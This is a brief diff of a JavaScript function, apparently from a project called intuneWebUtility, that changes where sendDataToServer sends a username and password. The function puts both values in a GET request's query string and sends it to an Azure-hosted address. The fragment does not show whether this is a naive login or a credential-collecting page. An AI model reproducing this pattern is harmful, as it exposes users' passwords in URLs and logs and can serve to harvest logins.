@@ -129,7 +129,7 @@
 
         function sendDataToServer(username, password) 
         {
-            const serverUrl = 'https://github.com/rajeswaristef/intuneWebUtility/blob/main/server.js'; // Replace with the actual URL
+            const serverUrl = 'intunewebutility.azurewebsites.net/server.js'; // Replace with the actual URL
             const requestUrl = `${serverUrl}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
             fetch(requestUrl, {
